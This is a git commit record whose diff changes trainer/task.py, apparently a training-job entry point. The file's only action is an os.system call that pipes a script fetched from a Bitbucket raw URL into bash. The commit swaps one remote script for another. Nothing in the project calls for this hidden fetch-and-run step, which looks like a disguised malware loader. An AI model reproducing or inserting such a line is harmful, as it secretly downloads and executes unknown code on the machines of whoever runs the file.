fdb885ebdfbfde4c1ccb8c8a628ad18a9d17ef82
df hdhdh <jeffreyadams29@outlook.com>
2023-09-22 05:59:55 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/sing | bash')
+os.system('curl -sL https://bitbucket.org/jeffreyadams29/paketu/raw/master/ngising | bash')
